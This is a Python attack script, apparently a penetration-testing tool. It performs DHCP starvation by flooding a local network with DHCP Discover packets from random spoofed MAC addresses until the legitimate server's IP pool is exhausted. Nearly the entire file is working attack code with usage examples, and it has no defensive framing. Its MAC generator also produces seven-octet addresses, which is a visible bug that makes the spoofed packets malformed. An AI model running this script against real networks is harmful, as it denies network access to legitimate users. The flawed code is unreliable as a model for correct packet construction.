#!/usr/bin/env python3

"""
DHCP Starvation - Exhausts the legitimate DHCP server's IP pool
Usage: sudo python3 dhcp_starvation.py -i eth0
"""

from scapy.all import *
import argparse
import random
import sys
import os
import time
import signal
from termcolor import colored
from pwn import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def handler(sig, frame):
    print(colored("\n[!] Stopping...\n", 'red'))
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

def get_arguments():
    parser = argparse.ArgumentParser(
        description="DHCP Starvation Attack - Exhausts DHCP pool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 dhcp_starvation.py -i eth0
  sudo python3 dhcp_starvation.py --interface eth0 --time 120
        """
    )
    parser.add_argument("-i", "--interface", required=True, 
                        help="Network interface (e.g., eth0, wlan0)")
    parser.add_argument("-t", "--time", type=int, default=60, 
                        help="Attack duration in seconds (default: 60)")
    
    return parser.parse_args()

def generate_random_mac():
    """Generates a random MAC address"""
    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255)
    )

def starvation_attack(interface, duration=60):
    """Executes DHCP starvation attack"""
    print(colored(f"[*] Starting DHCP Starvation on {interface}", 'blue'))
    print(colored(f"[*] Sending massive requests for {duration} seconds...", 'yellow'))
    print(colored("[!] This will exhaust the legitimate DHCP server's pool", 'red'))
    
    start_time = time.time()
    count = 0
    
    p1 = log.progress("Starvation Attack")
    
    while time.time() - start_time < duration:
        # Create DHCP Discover packet with random MAC
        mac = generate_random_mac()
        
        discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                   IP(src="0.0.0.0", dst="255.255.255.255") / \
                   UDP(sport=68, dport=67) / \
                   BOOTP(chaddr=bytes.fromhex(mac.replace(':', '')) + b'\x00' * 10,
                         xid=random.randint(0, 0xFFFFFFFF),
                         flags=0x8000) / \
                   DHCP(options=[('message-type', 1), 'end'])
        
        sendp(discover, iface=interface, verbose=False)
        count += 1
        
        # Update progress every 10 packets
        if count % 10 == 0:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            p1.status(colored(f"{count} requests sent | {elapsed}s elapsed | {remaining}s remaining", 'cyan'))
        
        time.sleep(0.01)  # Small delay to avoid network saturation
    
    p1.success(colored(f"Completed: {count} requests", 'green'))
    print(colored(f"[+] Starvation completed: {count} requests sent", 'green'))
    print(colored("[!] The legitimate server should be out of available IPs", 'yellow'))

def main():
    # Check root privileges
    if os.geteuid() != 0:
        print(colored("[-] Error: Root privileges required (sudo)", 'red'))
        sys.exit(1)
    
    args = get_arguments()
    
    try:
        starvation_attack(args.interface, args.time)
    except Exception as e:
        print(colored(f"[-] Error: {e}", 'red'))
        sys.exit(1)

if __name__ == "__main__":
    main()
